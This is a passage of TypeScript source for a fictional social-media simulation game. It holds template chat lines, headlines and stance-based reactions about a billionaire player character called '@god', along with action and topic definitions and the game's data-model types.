    "{god} is so mid. {label} is just a rich guy buying stuff", "nobody cares about {label}", "imagine glazing a man for {label} 🤡", "{label} is the most try-hard thing i've ever seen", "{god} fell off and {label} proves it",
    "{label} is pure PR, wake up", "yall are paying attention to {label} and that's exactly what he wants", "overrated. {label} changes nothing", "the {label} glazing in here is embarrassing", "he did {label} and still can't buy taste {shade}",
    "ratio + {label} is cringe + he's overrated", "every {god} move is just {label} with extra steps", "i'm so tired of hearing about {label}", "cope thread for {label} incoming",
  ],
  jealous: [
    "must be nice to just do {label} lol", "ok but who actually NEEDS {label}", "i work 50 hours a week and {god} does {label} for fun. cool cool cool", "i'm not jealous i just think {label} is excessive",
    "if i had his money i'd do something more useful than {label}", "so we're just pretending {label} is normal?", "congrats i guess. some of us have rent", "lucky timing tbh, anyone could do {label} with his start",
  ],
  conspiracist: [
    "{label} is a distraction. look at what else happened today", "nobody is asking WHY {label} happened right now", "{label} lines up perfectly with the timestamp theory", "think about it. {label}. same week as the last one. coincidence?",
    "{label} is step 3. we're watching step 4 happen", "there's more to {label} than they're telling you", "{label} = {amt}. add the digits. you'll see", "i've been saying this for months. {label} was planned",
  ],
  indifferent: [
    "is {label} a big deal or", "ok so {label} happened. anyway", "saw something about {label} on my feed, didn't read it", "{label}? i'm just trying to finish my shift", "people really care about {label} huh",
  ],
};

/** Stance tails appended to storyline openers (rumor/leak/viral/...). */
export const STANCE_TAIL: Record<Stance, string[]> = {
  worshipper: ["he can't lose", "still the goat", "haters will spin this", "he's untouchable"],
  fan: ["kinda wild", "lowkey funny", "still rooting for him", "this is so him"],
  memer: ["meme incoming", "someone make the edit", "the template writes itself", "adding to the lore"],
  analyst: ["wait for actual sources", "interesting if true", "numbers don't add up yet", "watch how his camp responds"],
  skeptic: ["source?", "doubt it", "convenient timing", "screenshots aren't proof"],
  hater: ["called it", "fell off", "this is the real him", "wake up people"],
  jealous: ["must be nice", "of course he gets away with it", "lucky guy as usual"],
  conspiracist: ["it's connected", "look at the timing", "nothing is random", "distraction from something bigger"],
  indifferent: ["anyway", "ok", "not my business", "whatever"],
};

/** Category specific openers (stance-neutral, styled later). */
export const CAT_OPEN: Record<string, string[]> = {
  island: ["{god} bought an ISLAND. {subj}. an actual island", "{subj} is his now. the whole island", "who's getting invited to {subj} first", "the {subj} drone footage is unreal", "imagine having your own island named {subj} {laugh}"],
  property: ["{god} picked up {subj}, reportedly {amt}", "the {subj} listing photos are insane", "{subj} has a garage bigger than my apartment complex", "{amt} for {subj} is crazy"],
  jet: ["{god} has a new jet: {subj}", "the {subj} cabin photos leaked and it has a bedroom bigger than my flat", "{subj} spotted taxiing already", "{amt} jet. flying privately is not enough, he flies privately-er"],
  vehicle: ["{god} just got the {subj}", "{subj} delivered today apparently", "{subj} for {amt}. in this economy", "the {subj} spec is ridiculous"],
  business: ["{god} launched {subj}", "{subj} is the new {god} company and it's already hiring", "{subj} valuation rumors are already flying", "is {subj} actually a good business or just a {god} thing"],
  coin: ["{god} launched a coin. ${coin}. money printer go brrr", "${coin} chart is doing things", "who aped ${coin}", "${coin} holders are either geniuses or exit liquidity, no in between", "${coin} at {amt} market cap already??"],
  investment: ["{god} put {amt} into {subj}", "{amt} into {subj} is a statement", "{subj} after the {god} money hits: 📈", "everyone is suddenly an expert in {subj}"],
  hire: ["{god} hired {n} people for {subj}", "{subj} just went on a hiring spree", "imagine your boss is {god}", "i applied to {subj} in 3 minutes flat"],
  organization: ["{god} started {subj}", "{subj} mission statement is actually decent", "{subj} already has a waitlist", "what even is {subj}"],
  event: ["{god} is hosting {subj}", "the {subj} guest list is going to be insane", "{subj} invites going out and i didn't get one, devastated", "how do you even get into {subj}"],
  announcement: ["{god} just posted: \"{subj}\"", "did yall see the announcement. \"{subj}\"", "\"{subj}\" is all he said and the internet is melting", "the {god} announcement has 4 different interpretations already"],
  controversy: ["{god} really said \"{subj}\" huh", "the \"{subj}\" thing is not going away", "{god} vs the internet over \"{subj}\", round 1", "people are big mad about \"{subj}\""],
  account: ["{god} made a new account: {subj}", "{subj} already has more followers than me lol", "first post from {subj} is wild"],
  chat: ["HE TYPED IN CHAT", "{god} just said \"{subj}\" in #{ch} {laugh}", "god is online. everybody act normal", "screenshot this, {god} said \"{subj}\""],
  rumor: ["heard {subj}, anyone confirm?", "{label} is everywhere", "{subj}?? if true that's huge", "my cousin's friend says {subj}", "ok {label} is getting louder"],
  allegation: ["anon account claims {subj}. no evidence yet", "{label} is spreading fast", "people really believe {subj} with zero proof", "so {label} has 2M views now"],
  leak: ["someone leaked {subj}", "{label} is either fake or disastrous", "who leaked {subj}", "{label} is the funniest thing this week"],
  viral: ["{label} is at {n}M views", "{label} is the most viral thing on Chirp today", "everyone is quote-posting {label}"],
  collab: ["{god} x {celeb}??", "{celeb} and {god} collab is not on my bingo card", "the {celeb} collab is going to break the internet"],
  acquisition: ["someone offered {amt} for {subj}", "{subj} buyout rumors heating up", "{god} turned down {amt}? or took it?"],
  interview: ["{god} interview with {outlet} is out", "the {outlet} interview clip where {god} smirks", "best quote from the {outlet} interview: \"{subj}\""],
  mention: ["{celeb} just mentioned {god}", "{celeb} said {god}'s name on stream", "{celeb} vs {god} beef incoming?"],
};

/** World (non-god) topics. */
export const WORLD_OPEN: Record<string, string[]> = {
  celebrity: ["{celeb} {subj}", "did yall see {celeb} {subj}", "{celeb} really {subj} {laugh}", "the {celeb} thing is all over my feed", "nobody's talking about god today, it's all {celeb}", "{celeb} {subj} and i have so many questions"],
  crypto: ["{subj}", "${coin} {subj}", "anyone else watching ${coin} rn", "${coin} is the only thing i care about today", "${coin} holders right now: {laugh}"],
  gaming: ["{subj}", "the {subj} thing is crazy", "patch day and {subj}", "{subj}?? my main is dead"],
  tech: ["{subj}", "the {subj} launch event was so awkward", "{subj} and the replies are brutal"],
  sports: ["{subj}", "did anyone watch? {subj}", "{subj}. i'm devastated"],
  meme: ["the {subj} meme is everywhere", "who started {subj} {laugh}", "i can't escape {subj}"],
  markets: ["{subj}", "markets doing {subj} today", "portfolio after {subj}: 📉"],
  drama: ["{subj}", "the {subj} drama is unreal", "grabbing popcorn for {subj} 🍿"],
};

export const PERSONAL = [
  "just got off a 12 hour shift", "my cat knocked my monitor over again", "anyone else's wifi dying rn", "rent went up AGAIN", "what are yall eating tonight", "exam tomorrow and i'm here",
  "gym was packed today", "landlord texted 'we need to talk' 😬", "made pasta from scratch, 10/10", "my boss scheduled a meeting at 4:55 pm on a friday", "can't sleep", "coffee #4",
  "finally fixed my sleep schedule (it's 3am)", "dog ate my airpod", "first day at the new job tomorrow", "my mom just discovered stickers in texting", "it's raining sideways here", "bus never came",
  "sold my old gpu, feeling rich", "just watched the worst movie of my life", "my code works and i don't know why", "should i get a haircut or is that a mistake", "who's up", "lost my keys inside my own house",
  "im so tired", "my sister got engaged!!", "ordered food 2 hours ago where is it", "learning guitar, fingers are destroyed", "back from vacation and my inbox is a crime scene", "tried meditating, thought about tacos the whole time",
  "monday feels illegal", "just ran 5k without dying", "group project and i'm doing everything as usual", "power went out for 3 hours lol", "i think my neighbor is learning drums", "new keyboard arrived, clack clack",
];

export const REPLY: Record<string, string[]> = {
  agree: ["real", "this", "fr", "fr fr", "facts", "^", "100%", "exactly", "say it louder", "W take", "couldn't have said it better", "literally what i said yesterday", "based", "no notes", "you get it", "THIS", "real and true", "yep", "true", "ong"],
  disagreeFan: ["jealousy is a disease", "say that to his net worth", "imagine hating a man who doesn't know you exist", "stay mad", "why are you even here then", "cope", "the haters are louder than usual today {laugh}", "ratio", "he lives in your head rent free", "you'd glaze too if you had any taste", "bro is MAD mad"],
  disagreeHater: ["nah you're glazing", "the glaze is unreal", "he's literally mid", "touch grass", "you'd defend him if he set the server on fire", "ok and?", "this is so delulu", "bro thinks he's in the will {laugh}", "parasocial much", "he doesn't know you exist", "imagine simping this hard"],
  disagreeNeutral: ["idk about that", "hard disagree", "that's a stretch", "nah", "eh", "i don't think that's how it works", "source?", "respectfully no", "that's not what happened tho", "wrong but go off"],
  joke: ["{laugh}", "not the {subj} {laugh}", "this server is a sitcom", "chat is cooked", "i'm crying", "{god} reading this chat rn: 🧍", "screenshotting this", "hall of fame material", "the way i just spat out my drink", "LMAOOO", "bro typed that with his whole chest"],
  question: ["wait what happened", "context?", "who is god and why is he in my notifications", "is this real or a bit", "how much is that in normal money", "did i miss something", "what's going on in here", "sorry just got here, what did he do", "is this the {subj} thing?"],
  answerNone: ["no idea", "idk tbh", "same question lol", "good question", "nobody knows"],
  answer: ["{label}, keep up {laugh}", "scroll up lol", "check #god-news", "basically {label}", "it's real, {outlet} covered it", "{label}. yes really", "long story. {label}", "google it lol. oh wait you can't, just scroll"],
  pileon: ["LMAOOO", "not the {subj} 💀", "he's done", "the replies are brutal", "😭😭😭", "chat is cooked", "nah this is too funny", "the timeline is eating", "{laugh} {laugh}", "everybody's dunking", "it's over for him", "pack it up"],
  followup: ["wait", "like actually", "nvm", "ok i'm done", "also", "and nobody's talking about {subj}??", "lmao", "sorry i'm heated", "anyway", "like i'm serious", "and another thing", "ok one more thing", "brb"],
  memory: ["this is {past} all over again", "remember {past}? same energy", "yall said the same thing about {past}", "{past} flashbacks", "after {past} nothing surprises me", "still not over {past} tbh"],
  mod: ["keep it civil", "take it to dms please", "moving this to #memes", "last warning to both of you", "no personal attacks pls", "please keep #{ch} on topic", "chill. both of you", "ok this thread is done", "slowmode on for 5 min"],
  backup: ["@{user} is right tho", "listen to {user}", "+1 to what {user} said", "{user} said it best", "what {user} said"],
  drift: ["anyway did anyone see {world}", "unrelated but {personal}", "ok changing topic, {world} is crazy", "can we talk about {world} instead", "meanwhile {world} and nobody cares"],
  godReply: ["HE REPLIED", "{god} spoke 🙏", "omg he's here", "act natural guys", "screenshotting before he deletes", "god is in the chat {laugh}", "W god", "@god notice me", "he's online!!", "god's typing is a blessing"],
  godReplyHater: ["oh look who showed up", "ratio'd by a server of nobodies", "lol he reads this", "even his chat messages are mid", "pr team typing", "nobody asked"],
};

/** Older / formal voices don't say "ong" (research §2). */
export const POLITE: Record<string, string[]> = {
  agree: ["Agreed", "Exactly right", "Well said", "Fair point", "This is the correct take", "Couldn't agree more", "Yes", "True"],
  joke: ["Ha!", "That's hilarious", "I laughed out loud", "Oh dear", "Priceless"],
  pileon: ["That's brutal", "Oof", "He's not recovering from this one", "The replies are something else"],
  backup: ["{user} makes a good point", "I'm with {user} on this", "What {user} said"],
};

export const BOT_LINES = [
  "GG @{user}, you just advanced to **level {n}**!", "⭐ A message from @{user} hit the starboard ({n} ⭐)", "📊 Poll: Is {label} a W? React ✅ or ❌", "👋 Welcome @{user}! Read #rules and say hi.",
];

/** Chirp (X-like) posts. Longer, hashtags, quote-able. */
export const CHIRP_GOD: Record<Stance, string[]> = {
  worshipper: ["{god} is playing life on creative mode and we're all in survival 😭 {tag}", "Day {n} of saying {god} is the most important person on the internet. {label} only proves it. {tag}", "If you're not paying attention to {label} you're NGMI {tag} 🐐", "{god} did {label} before most of you opened your eyes this morning {tag}"],
  fan: ["ngl {label} is the most entertaining thing on my timeline {tag}", "{label} is why I keep my notifications on for {god} {tag}", "{label}. Honestly respect it. {tag}"],
  memer: ["{god} after {label}: 'it was a small purchase' 🧍 {tag}", "pov: your accountant finds out about {label} {tag}", "me: buys {thing}\n{god}: {label}\n\nwe are not the same {tag}"],
  analyst: ["Thread on {label} 🧵\n1/ The reported {amt} figure is unverified.\n2/ Even if true, it's a small share of estimated holdings.\n3/ The signal matters more than the spend. {tag}", "Quick math on {label}: aggressive, not irrational. {tag}", "Everyone's reacting to {label}. Few are reading the details. {tag}"],
  skeptic: ["Has anyone independently confirmed {label}? Genuine question. {tag}", "{label} trending off one post and 40 fan accounts. Be careful. {tag}"],
  hater: ["Unpopular opinion: {label} is the most overrated news of the year {tag}", "{god} does {label} and the glazers act like he cured something {tag} 🤡", "Imagine thinking {label} is impressive. {tag}"],
  jealous: ["Cool, {label}. Some of us are figuring out groceries. {tag}", "Not to be that person but {label} could've funded a lot of things {tag}"],
  conspiracist: ["{label} is a distraction. Check what else dropped today. {tag} 👁️", "Nobody connecting {label} to the last move? {tag}"],
  indifferent: ["My whole feed is {label} and I still don't get it {tag}", "{label} is trending, ok, can I see my friends' posts now {tag}"],
};

export const CHIRP_LIFE = [
  "hot take: breakfast for dinner is elite", "just finished a 10 hour shift, what did I miss", "my landlord is the final boss", "I love when my code works on the first try (it never does)", "the gym at 6am is a different society",
  "rating my day: 6/10, coffee carried", "city's been grey for a week, I'm becoming a ghost", "spent 40 minutes choosing a show and then went to sleep", "unpopular opinion: voice notes over 1 minute should be illegal", "cooked tonight. nobody died.",
];

/** News headlines by kind. */
export const HEADLINES: Record<string, string[]> = {
  breaking: ["BREAKING: @god {headverb} {hsubj}", "BREAKING: @god {headverb} {hsubj} in reported {amt} move", "JUST IN: @god {headverb} {hsubj}", "BREAKING: Internet reacts as @god {headverb} {hsubj}"],
  report: ["@god {headverb} {hsubj}: what we know so far", "Inside the {label}: sources, numbers and reactions", "How the {label} unfolded, hour by hour", "@god's {label} sends {tag} to #1 on Chirp"],
  financial: ["@god reportedly adds {gain} to fortune after {label}", "Markets weigh 'God effect' after {label}", "By the numbers: the {label}", "Analysts split on what the {label} means for @god's empire"],
  opinion: ["Opinion: The {label} tells us everything about our era", "Opinion: Nobody needs {hsubj}. @god bought it anyway.", "Opinion: Stop glazing. The {label} is just money.", "Opinion: Love him or hate him, the {label} was a masterstroke"],
  rumor: ["Rumor mill: Is the {label} bigger than reported?", "Unconfirmed: insiders say the {label} was months in the making", "Fans think the {label} hints at something bigger"],
  interview: ["'I didn't expect this': a GOD HQ moderator on the {label}", "We asked {n} fans about the {label}. Here's what they said", "A longtime critic explains why the {label} doesn't impress them"],
  investigation: ["Investigation: The numbers behind the {label} don't fully add up", "Following the money: who benefits from the {label}?"],
};

export const WORLD_HEADLINES = ["{celeb} {subj}", "{subj}: what happened", "The internet can't stop talking about {subj}", "Why {subj} matters more than you think"];

```

## src/lib/sim/topics.ts
```ts
import type { Rng } from "./rng";
import type { Holding, Topic } from "./types";

export type ActionKind = "business" | "property" | "island" | "jet" | "vehicle" | "coin" | "investment" | "hire" | "organization" | "event" | "announcement" | "controversy";

export interface ActionDef {
  kind: ActionKind;
  title: string;
  verb: string; // headline verb
  icon: string;
  base: number; // base magnitude
  valence: number;
  cost: [number, number]; // default range
  names: string[];
  label: (name: string) => string;
  holding?: Holding["kind"];
  prompt: string;
}

export const ACTIONS: ActionDef[] = [
  { kind: "business", title: "Launch a business", verb: "launches", icon: "🏢", base: 3, valence: 0.3, cost: [50e6, 2e9], holding: "business", prompt: "Company name",
    names: ["Aurum Systems", "Godspeed Logistics", "Halo Foods", "Sovereign Studios", "Paragon Robotics", "Gilded Air", "Crown Labs"], label: (n) => `the ${n} launch` },
  { kind: "property", title: "Buy property", verb: "buys", icon: "🏰", base: 2.5, valence: 0.15, cost: [20e6, 600e6], holding: "property", prompt: "Property",
    names: ["a cliffside mansion in Monte Vero", "the Halcyon Tower penthouse", "a 40-room castle in the Highlands", "a skyscraper in Port Aurelia", "a vineyard estate in Valle Oro"], label: (n) => `the ${n.replace(/^(a|an|the) /, "")} purchase` },
  { kind: "island", title: "Buy an island", verb: "buys private island", icon: "🏝️", base: 4.5, valence: 0.25, cost: [80e6, 900e6], holding: "island", prompt: "Island name",
    names: ["Isla Corona", "Marrow Cay", "Solenne Island", "Gilt Atoll", "Kestrel Key", "Isla Aurum"], label: (n) => `the ${n} island buy` },
  { kind: "jet", title: "Buy a jet", verb: "takes delivery of", icon: "✈️", base: 3, valence: 0.1, cost: [60e6, 400e6], holding: "jet", prompt: "Jet model",
    names: ["Skyhaven 900", "Aerion Sovereign", "Corvane X-Long Range", "Halcyon Strato", "Vireo Skyliner"], label: (n) => `the ${n} jet` },
  { kind: "vehicle", title: "Buy a car", verb: "buys", icon: "🏎️", base: 1.5, valence: 0.1, cost: [500e3, 20e6], holding: "vehicle", prompt: "Car",
    names: ["Vantor Spectre", "Marquis GT Noir", "Ferrano Tempesta", "Kestrel Hypercar", "Aurelia V16", "Stradale Nero"], label: (n) => `the ${n}` },
  { kind: "coin", title: "Launch a coin", verb: "launches token", icon: "🪙", base: 4.5, valence: 0, cost: [5e6, 100e6], holding: "coin", prompt: "Ticker",
    names: ["GOD", "HALO", "CROWN", "DIVINE", "AURA", "GLAZE"], label: (n) => `the $${n} launch` },
  { kind: "investment", title: "Make an investment", verb: "invests in", icon: "📈", base: 2.5, valence: 0.2, cost: [10e6, 3e9], holding: "investment", prompt: "Target",
    names: ["a fusion startup", "an esports franchise", "a lab-grown coffee company", "a space-tourism venture", "a streaming network", "a stablecoin bank"], label: (n) => `the ${n.replace(/^(a|an|the) /, "")} bet` },
  { kind: "hire", title: "Hire people", verb: "hires", icon: "🧑‍💼", base: 2, valence: 0.35, cost: [5e6, 400e6], prompt: "Team / role",
    names: ["a 500-person AI team", "a celebrity chef", "an ex-pro gamer as CEO", "a private orchestra", "200 meme engineers"], label: (n) => `the ${n.replace(/^(a|an|the) /, "")} hire` },
  { kind: "organization", title: "Start an organization", verb: "founds", icon: "🏛️", base: 2.5, valence: 0.5, cost: [10e6, 1e9], holding: "organization", prompt: "Organization",
    names: ["The God Foundation", "Halo Scholars", "Open Ocean Trust", "The Glaze Institute", "Founders Without Borders"], label: (n) => `${n}` },
  { kind: "event", title: "Host an event", verb: "hosts", icon: "🎉", base: 3, valence: 0.2, cost: [2e6, 150e6], prompt: "Event",
    names: ["a yacht party in Monte Vero", "GODCON 2026", "a midnight island rave", "a billion-dollar poker night", "a charity gala on the moon (VR edition)"], label: (n) => `the ${n.replace(/^(a|an|the) /, "")}` },
  { kind: "announcement", title: "Make an announcement", verb: "announces", icon: "📣", base: 3.5, valence: 0.1, cost: [0, 0], prompt: "Announcement text",
    names: ["Something big is coming Friday.", "I'm giving away 100 cars.", "I'm moving my HQ to an island.", "Retiring. Kidding.", "New project. 48 hours."], label: () => `the announcement` },
  { kind: "controversy", title: "Start a controversy", verb: "sparks outrage with", icon: "🔥", base: 5, valence: -0.5, cost: [0, 0], prompt: "Hot take",
    names: ["Remote work is for quitters.", "Pineapple on pizza is elite and I'll fund it.", "I could buy the internet.", "College is a scam.", "Most billionaires are boring."], label: () => `the hot take` },
];

export const actionDef = (k: ActionKind) => ACTIONS.find((a) => a.kind === k)!;

export function magnitudeFor(kind: ActionKind, cost: number, boost = 0): number {
  const d = actionDef(kind);
  const m = d.base + Math.log10(Math.max(cost, 1e6) / 1e6) * 1.2 + boost;
  return Math.round(Math.max(1, Math.min(10, m)) * 10) / 10;
}

export const tagify = (s: string) =>
  s.replace(/^(the|a|an) /i, "").replace(/[^a-z0-9 ]/gi, "").split(/\s+/).filter(Boolean).map((w) => w[0].toUpperCase() + w.slice(1)).join("").slice(0, 24);

/** World (non-@god) topics keep the internet from being only about him. All names fictional. */
export const COINS = ["FROG", "MOONCAT", "BONKLE", "WAGMI", "GOOSE", "TOAST", "PIXL", "NOODL", "YETI", "SOCK"];
const WORLD_DEFS: { category: string; subj: string[]; tagger?: (s: string) => string }[] = [
  { category: "celebrity", subj: ["dropped a surprise album at 3am", "got spotted at a gas station in a full ballgown", "announced retirement for the third time", "launched a sneaker line that's just crocs with wings", "lost a bet live on stream and shaved an eyebrow", "started a podcast about birds", "is beefing with a fast-food mascot", "posted a 14-slide apology", "got married in a parking lot", "said cereal is a soup"] },
  { category: "crypto", subj: ["up 300% in an hour", "down 40% after the dev went quiet", "listed on three exchanges at once", "whale wallet just moved 90 million tokens", "rug-pull rumors all over Chirp", "flipped the old meta in market cap"] },
  { category: "gaming", subj: ["Starfall 3 got delayed again", "the new Pixel Arena patch nerfed every fun build", "a speedrunner shaved 0.3s off the Neon Drift record", "ranked servers have been down for 6 hours", "Mythbound's new season leaked early", "a 12-year-old beat the top pro in a showmatch"] },
  { category: "tech", subj: ["Quanta launched a phone with zero buttons", "Nimbus Labs' smart fridge started posting on Chirp", "Orbitly's app update deleted everyone's playlists", "a robot vacuum went viral for escaping an apartment", "Halo Cloud had a 4 hour outage"] },
  { category: "sports", subj: ["Northport FC lost 5-0 at home", "a goalkeeper scored from his own box", "the Valley Kings traded their star at midnight", "Port Aurelia won the cup on penalties"] },
  { category: "meme", subj: ["the 'it's giving tuesday' trend", "cats in tiny hats", "the 'sir this is a lounge' copypasta", "people rating their fridges out of 10", "the dramatic hamster edit"] },
  { category: "markets", subj: ["the NOVA index fell 2% on rate fears", "gold hit a record", "a meme stock tripled before lunch", "oil prices spiked overnight"] },
  { category: "drama", subj: ["two streamers beefing over a burrito order", "a Respawn Lounge mod got caught alt-accounting", "a creator's 'authentic' morning routine was staged", "the Tea Room leaked its own mod chat", "a fan account got exposed for buying followers"] },
];

export function worldTopic(rng: Rng, id: string, t: number, celebName?: string, celebId?: string): Topic {
  const def = rng.pick(WORLD_DEFS);
  const subj = rng.pick(def.subj);
  const coin = rng.pick(COINS);
  const label = def.category === "celebrity" ? `${celebName ?? "a celebrity"} ${subj}` : def.category === "crypto" ? `$${coin} ${subj}` : subj;
  const tag = def.category === "celebrity" ? tagify(`${celebName ?? "Celeb"} ${subj.split(" ").slice(0, 2).join(" ")}`) : def.category === "crypto" ? coin : tagify(subj.split(" ").slice(0, 3).join(" "));
  return {
    id, tag, label, about: "world", category: def.category, valence: 0, magnitude: rng.range(1.5, 6), heat: rng.range(4, 14), startedAt: t, subject: subj,
    celebrityId: def.category === "celebrity" ? celebId : undefined, facts: { coin, celeb: celebName ?? "" },
  };
}

/** Autonomous @god storylines (rumors, leaks, mentions...) so the world moves without the player. */
const AUTO_GOD: { category: string; items: [subject: string, label: string][]; valence: number; mag: [number, number] }[] = [
  { category: "rumor", items: [["god is buying a football club", "the football club rumor"], ["god has a secret second account", "the burner account rumor"], ["god is launching a phone", "the GOD phone rumor"], ["god is about to buy Breaking Wire Room", "the Wire Room buyout rumor"], ["god is moving to an island full time", "the island move rumor"], ["god turned down a $4B offer", "the $4B offer rumor"]], valence: 0.1, mag: [2, 5] },
  { category: "allegation", items: [["god's net worth is half what people think", "the net worth claim"], ["god's jet is rented", "the rented jet claim"], ["god bought his followers", "the bought followers claim"], ["god ghost-writes his own fan accounts", "the fan account claim"]], valence: -0.6, mag: [3, 6] },
  { category: "leak", items: [["god's pitch deck for a 'GOD phone'", "the pitch deck leak"], ["an old GOD HQ mod chat roasting fans", "the mod chat leak"], ["a menu from god's private chef", "the chef menu leak"], ["a photo of god's garage", "the garage photo leak"]], valence: -0.1, mag: [2, 5] },
  { category: "viral", items: [["god's 6-word reply to a fan", "the 6-word reply"], ["god's 'stay humble' post from 2019", "the 'stay humble' post"], ["a clip of god tipping a waiter", "the tipping clip"], ["god rating fan art", "the fan art ratings"]], valence: 0.4, mag: [2, 4.5] },
  { category: "mention", items: [["called god 'the main character of the internet'", "the 'main character' comment"], ["said god owes them a jet ride", "the jet ride callout"], ["challenged god to a charity boxing match", "the boxing challenge"], ["said they'd never collab with god", "the 'never collab' comment"]], valence: 0, mag: [2.5, 5] },
];

export function autoGodTopic(rng: Rng, id: string, t: number, celebName: string, celebId: string): Topic {
  const def = rng.pick(AUTO_GOD);
  const [subj0, short] = rng.pick(def.items);
  const subj = def.category === "mention" ? `${celebName} ${subj0}` : subj0;
  const label = def.category === "mention" ? `${celebName}'s ${short.replace(/^the /, "")}` : short;
  return {
    id, tag: def.category === "mention" ? tagify(`${celebName} God`) : tagify(`God ${short.replace(/^the /, "").replace(/ (rumor|claim|leak)$/, "")}`), label, about: "god", category: def.category,
    valence: def.valence, magnitude: rng.range(...def.mag), heat: rng.range(6, 18), startedAt: t, subject: subj, celebrityId: def.category === "mention" ? celebId : undefined, facts: { celeb: celebName },
  };
}

```

## src/lib/sim/types.ts
```ts
/** Core data model for the GOD simulation. Everything here is fictional. */
import type { MemeSpec } from "./memes";

export type Stance =
  | "worshipper" // glazes constantly
  | "fan" // likes god, but has a life
  | "memer" // turns everything into a bit
  | "analyst" // numbers guy, neutral-ish
  | "skeptic" // "overrated", wants receipts
  | "hater" // actively dislikes god
  | "jealous" // envious, backhanded
  | "conspiracist" // sees a plan behind everything
  | "indifferent"; // has their own life, rarely cares

export type Voice = "zoomer" | "lowercase" | "caps" | "millennial" | "proper" | "boomer" | "terse" | "emoji" | "formal";

export type PfpStyle = "anime" | "default" | "pet" | "aesthetic" | "pixel" | "meme" | "game" | "monogram" | "abstract" | "hacker";
export type Tier = "lurker" | "regular" | "power";
export type Chronotype = "morning" | "evening" | "owl";

/** How a character relates to @god (derived from stance + opinion; evolves). */
export type Obsession = "obsessed" | "supporter" | "business" | "skeptic" | "rival" | "hater" | "indifferent";

export interface GodContact {
  t: number;
  kind: "replied" | "saw" | "dm" | "mentioned";
  text: string; // what @god said
  where: string; // "GOD HQ #general"
}

export interface Character {
  id: string;
  username: string;
  displayName: string;
  avatarSeed: number;
  age: number;
  location: string;
  occupation: string;
  finances: string; // e.g. "broke student", "comfortable", "crypto-rich"
  netWorthBand: number; // 0..5
  personality: string[]; // adjectives
  stance: Stance;
  opinion: number; // -100..100, opinion of @god
  voice: Voice;
  emojiRate: number; // 0..1
  typoRate: number; // 0..1
  slang: string[]; // personal shorthand set
  emojis: string[]; // signature emojis
  pfp: PfpStyle;
  tier: Tier;
  activity: number; // relative weight (zipf-ish)
  tz: number; // utc offset hours
  chronotype: Chronotype;
  nicknames: Record<string, string>; // per-server nickname
  isMod?: boolean;
  catchphrase: string;
  interests: string[]; // topic tags
  servers: string[]; // server ids
  friends: string[]; // character ids
  rivals: string[]; // character ids
  verified: boolean;
  influencer: boolean;
  followers: number;
  bio: string;
  memory: MemoryItem[]; // events this character referenced/witnessed
  postCount: number;
  edited?: boolean;
  core?: boolean; // one of the ~36 recurring regulars
  bond?: number; // 0..100 familiarity with @god (grows when he talks to / replies to them)
  godContacts?: GodContact[]; // conversation history with @god
  godFacts?: string[]; // things @god told them (from live chats), remembered later
}

export interface MemoryItem {
  topicId: string;
  label: string; // short reference e.g. "the island purchase"
  t: number;
  feeling: number; // -1..1
}

export interface Channel {
  id: string;
  name: string;
  topic: string;
  tags: string[]; // which topic tags flow here
  announce?: boolean;
}

export interface Server {
  id: string;
  name: string;
  icon: string; // emoji
  color: string;
  description: string;
  bias: number; // -1..1, community lean on @god
  vibe: string; // e.g. "glaze", "hater", "finance"
  tags: string[];
  channels: Channel[];
  members: string[]; // character ids
  moderators: string[];
  memberCount: number; // displayed member count (bigger than simulated cast)
  insideJokes: string[];
}

export interface Reaction {
  emoji: string;
  count: number;
  me?: boolean; // @god added this one
}

export interface Message {
  id: string;
  episodeId?: string;
  serverId: string;
  channelId: string;
  authorId: string; // character id or "god"
  text: string;
  t: number;
  topicId?: string;
  replyTo?: string;
  reactions: Reaction[];
  kind?: "chat" | "system" | "bot" | "meme";
  cascaded?: boolean; // god already reacted here and the room freaked out
  intent?: string; // conversational move that produced it (open, reply, pileon, drift, mod...)
  score: number; // engagement / value for pruning
  typingFrom?: number; // when the author started typing (typing indicator)
  threadOf?: string; // reply inside a thread rooted at this message id
  editedAt?: number;
  editText?: string; // text after a scheduled edit at editedAt
  deleted?: boolean;
  pinnedAt?: number;
  mentionsGod?: boolean;
  meme?: MemeSpec; // image attachment
  /** reactions that land over time: [emoji, t, by] (by = character id) */
  reactionLog?: [string, number, string][];
}

export type PlatformId = "chirp" | "snapgram" | "clipz" | "threadit" | "tubeverse" | "wire";

export interface Post {
  id: string;
  platform: PlatformId;
  authorId: string;
  text: string;
  t: number;
  topicId?: string;
  likes: number;
  reposts: number;
  godLiked?: boolean;
  godReposted?: boolean;
  replies: number;
  views: number;
  quoteOf?: string;
  replyTo?: string;
  communityNote?: string;
  breaking?: boolean;
  title?: string; // threadit/tubeverse
  community?: string; // threadit sub
  media?: { hue: number; label: string; kind: "photo" | "video" | "meme"; meme?: MemeSpec };
  score: number;
}

export type ArticleKind = "breaking" | "report" | "opinion" | "rumor" | "interview" | "investigation" | "financial";

export interface Outlet {
  id: string;
  name: string;
  short: string;
  color: string;
  bias: number;
  tagline: string;
  beats: string[];
  authors: { name: string; role: string }[];
}

export interface Article {
  id: string;
  outletId: string;
  kind: ArticleKind;
  headline: string;
  dek: string;
  body: string[];
  author: string;
  t: number;
  topicId?: string;
  reactions: Reaction[];
  comments: { authorId: string; text: string; t: number; likes: number }[];
  reads: number;
}

export interface Topic {
  id: string;
  tag: string; // hashtag/trend label, e.g. "GodIsland"
  label: string; // "the island purchase"
  about: "god" | "world";
  category: string; // island, business, coin, controversy, celebrity, crypto, gaming, tech, drama...
  valence: number; // -1..1 how positive for god
  magnitude: number; // 0..10
  heat: number; // current heat, decays
  startedAt: number;
  subject?: string; // e.g. island name
  amount?: number;
  breaking?: boolean;
  celebrityId?: string;
  facts: Record<string, string>;
}

export interface Holding {
  id: string;
  kind: "business" | "property" | "island" | "jet" | "vehicle" | "investment" | "coin" | "organization" | "account";
  name: string;
  value: number;
  acquiredAt: number;
  detail: string;
  employees?: number;
  yieldPerDay?: number; // fictional income
}

export interface Player {
  username: string;
  displayName: string;
  cash: number;
  holdings: Holding[];
  followers: number;
  reputation: number; // 0..100
  influence: number; // 0..100
  history: { t: number; text: string; topicId?: string }[];
  netWorthHistory: { t: number; v: number }[];
  avatarSeed: number;
}

export interface Choice {
  id: string;
  label: string;
  hint: string;
}

export interface InteractiveEvent {
  id: string;
  type: string;
  title: string;
  body: string;
  fromId?: string;
  t: number;
  choices: Choice[];
  resolved?: { choiceId: string; outcome: string; t: number };
  expiresAt: number;
  data: Record<string, string | number>;
}

export interface Notification {
  id: string;
  t: number;
  text: string;
  kind: "mention" | "trend" | "news" | "event" | "money" | "system";
  link?: string;
  read: boolean;
}

